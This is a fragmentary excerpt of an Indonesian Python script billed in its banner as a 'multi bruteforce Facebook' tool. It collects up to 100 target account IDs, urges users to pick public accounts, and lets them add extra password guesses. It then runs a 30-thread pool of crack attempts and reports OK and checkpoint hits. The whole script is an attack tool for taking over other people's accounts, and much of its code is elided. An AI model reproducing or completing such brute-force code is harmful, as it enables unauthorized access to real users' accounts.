...
██╔████╔██║██████╦╝█████╗░░{P}██████████████████████[/]
██║╚██╔╝██║██╔══██╗██╔══╝░░{P}██████████████████████[/]
██║░╚═╝░██║██████╦╝██║░░░░░ Made By {m}[Indo{P}nesia] {P}Coder[{h}RZ AM{P}]
╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░
MULTI BRUTEFORCE FACEBOOK""")
	nazri_ganteng(f"""(§) SC SIMPLE NO RIBET{h}💦{P}\n{P}(§) GITHUB: {k}@RZ AM [{h}Xone TEAM{P}]""")
	nazri_ganteng('──'* 25)
#--------------------[ MASUK ]--------------#
def login():
	try:
...
def dump_massal():
	...
	try:
		...
		print(f'{m}└─ GABISA NULIS YA LU ? HAMDEH GAGAL  ')
		exit()
	if jum<1 or jum>100:
		print(f'{m}└─ Failed Cari Yang Publik Akunya Biar Gampang Diajak IJO ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		print()
		print(f'{m}>>Penting:{k}ID WAJIB PUBLIK BIAR GAMPANG !!!')
		print()
		kl = input(f'{k}└─ Masukan ID Target  '+str(yz)+' : ')
		uid.append(kl)
...
def setting():
	...
	if hc in ['xshinchan','Xshinchan']:
		...
		method.append('mobile')
	pwplus=input(f'{k}╰─ Tambahin Password Manual Biar Gampang  y/t > ')
	nazri_ganteng('──'* 25)
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(f'{P}Masukkan kata sandi tambahan minimal 6 karakter\nContoh :[green] Indonesia,crotdalem,crotluar[white] ')
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'mobile' in method:
					...
					pool.submit(crack,idf,pwv)
		print('')
		cetak('\t[cyan]└─[green] CRACK TELAH SUKSES , CEK HASIL TESPEK CP / OK  DI MENU PERTAMA, JIKA TERKENA BUG JALANI ULANG SCNYA🖕👾🖕 [EHANXD] <<[white] ')
		print(f'{h} OK : {h}%s '%(ok))
